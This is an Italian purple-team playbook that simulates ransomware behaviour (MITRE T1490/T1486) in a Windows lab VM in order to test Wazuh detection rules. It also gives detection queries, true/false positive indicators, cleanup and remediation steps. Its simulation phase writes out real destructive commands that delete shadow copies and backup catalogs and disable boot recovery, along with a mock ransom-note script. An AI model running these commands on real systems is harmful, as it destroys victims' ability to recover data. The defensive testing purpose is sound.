# Playbook — T1490/T1486: Ransomware Behavior

## Metadati

| Campo | Valore |
|---|---|
| MITRE Technique | [T1490 — Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/) · [T1486 — Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/) |
| Tactic | Impact |
| Platform | Windows |
| VM | `target-windows` |
| Prerequisiti | Sysmon (EID 1 + EID 11), Wazuh Agent attivo, PowerShell admin |
| Detection rule | `custom_windows.xml` — 100030 (shadow delete), 100031 (bcdedit), 100032 (ransom note) |
| Severity attesa | Critical (level 12–14) |

---

## Obiettivo

Riprodurre i comportamenti **caratteristici del ransomware reale** (Ryuk, LockBit, Conti) *senza*
cifrare davvero nulla di importante:

1. **Inhibit System Recovery (T1490)** — cancellare le Shadow Copies e disabilitare il recovery, così
   la vittima non può ripristinare i file. È il primo passo di quasi ogni ransomware.
2. **Data Encrypted for Impact (T1486)** — simulare la cifratura di massa e il rilascio della *ransom
   note*, su file di test in una cartella dedicata.

> ⚠️ Solo dentro la VM `target-windows`. La cancellazione delle shadow copy è un'azione **reale** ma in
> un lab usa-e-getta è innocua. La "cifratura" qui è simulata su file fittizi.

---

## Prerequisiti

```powershell
# PowerShell come AMMINISTRATORE nella VM
Get-Service Sysmon64, WazuhSvc

# Crea dei file "vittima" di test in una sandbox
$lab = "C:\RansomLab"; New-Item -ItemType Directory $lab -Force | Out-Null
1..20 | % { "documento importante $_" | Out-File "$lab\file_$_.docx" }
```

---

## Simulazione

### Fase 1 — Inhibit System Recovery (T1490) ⭐

```cmd
REM Cancella tutte le Shadow Copies (comportamento ransomware n.1)
vssadmin delete shadows /all /quiet

REM Variante WMI (alcuni ransomware la preferiscono)
wmic shadowcopy delete

REM Disabilita il recovery automatico di Windows
bcdedit /set {default} recoveryenabled no
bcdedit /set {default} bootstatuspolicy ignoreallfailures

REM Cancella i backup di sistema
wbadmin delete catalog -quiet
```

> Trigger: regola **100030** (vssadmin/wmic/wbadmin delete shadows) e **100031** (bcdedit recovery).

### Fase 2 — Simulazione cifratura + ransom note (T1486)

```powershell
$lab = "C:\RansomLab"
# "Cifra" i file: rinomina con estensione tipica ransomware (simulazione, niente crypto reale)
Get-ChildItem $lab -File | ForEach-Object {
    Rename-Item $_.FullName "$($_.FullName).locked"
}
# Rilascia la ransom note
@"
YOUR FILES HAVE BEEN ENCRYPTED
To recover your files send 1 BTC to ...
(SIMULAZIONE LAB — nessun file e' stato realmente cifrato)
"@ | Out-File "$lab\HOW_TO_DECRYPT.txt"
```

> Trigger: regola **100032** (file `.locked` + ransom note `HOW_TO_DECRYPT.txt`).

### Fase 3 — Atomic Red Team

```powershell
Import-Module Invoke-AtomicRedTeam
Invoke-AtomicTest T1490 -TestNumbers 1,2,3   # shadow copy deletion
```

---

## Alert atteso su Wazuh

```
rule.id: 100030        rule.level: 14
rule.description: "[T1490] Shadow copy/backup deletion (ransomware pre-encryption): vssadmin delete shadows /all /quiet"
rule.mitre.id: ["T1490"]
agent.name: target-windows
```
```
rule.id: 100032        rule.level: 12
rule.description: "[T1486] Possible ransomware artifact (note or encrypted file): C:\RansomLab\HOW_TO_DECRYPT.txt"
```

---

## Come verificare la detection

```
agent.name: "target-windows" AND rule.id: (100030 OR 100031 OR 100032)
```
```
rule.groups: ransomware
```

---

## Verifica True Positive vs False Positive

| Indicatore | True Positive | False Positive |
|---|---|---|
| `vssadmin delete shadows /all` | Quasi sempre malevolo | Raro: alcune attività di manutenzione/backup |
| `bcdedit recoveryenabled no` | Malevolo | Hardening insolito documentato |
| File `.locked`/`.encrypted` di massa | Ransomware | — |
| Ransom note (`HOW_TO_DECRYPT`) | Ransomware | — |
| Processo padre | cmd/powershell/binario sconosciuto | Software di backup firmato |

---

## Cleanup

```powershell
Remove-Item C:\RansomLab -Recurse -Force -ErrorAction SilentlyContinue
# Riabilita il recovery
bcdedit /set {default} recoveryenabled yes
bcdedit /deletevalue {default} bootstatuspolicy 2>$null
```

> Le shadow copy cancellate non si recuperano: in un lab usa-e-getta va bene; altrimenti ripristina da snapshot VirtualBox.

---

## Remediation

1. **Backup offline / immutabili** (3-2-1): l'unica vera difesa contro la cifratura.
2. Allerta ad alta priorità su `vssadmin delete shadows` e `bcdedit recoveryenabled no` (questa regola).
3. **Controlled Folder Access** (Defender) per proteggere le cartelle utente dalla cifratura.
4. Isolamento rapido dell'host all'alert T1490 — di solito precede la cifratura di pochi minuti.
5. Limitare i privilegi: la cancellazione delle shadow copy richiede l'elevazione.
